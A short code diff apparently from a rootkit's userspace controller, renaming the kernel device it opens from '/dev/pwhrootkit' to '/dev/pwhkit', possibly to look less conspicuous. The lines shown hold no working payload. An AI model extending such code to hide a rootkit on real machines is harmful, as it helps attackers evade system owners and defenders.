@@ -16,7 +16,7 @@ int main(int argc, char ** argv){
     int opt;
     pid_t pid = 0;
 
-    fd = open("/dev/pwhrootkit", O_RDONLY);
+    fd = open("/dev/pwhkit", O_RDONLY);
     if(fd < 0){
         perror("open");
         return -1;
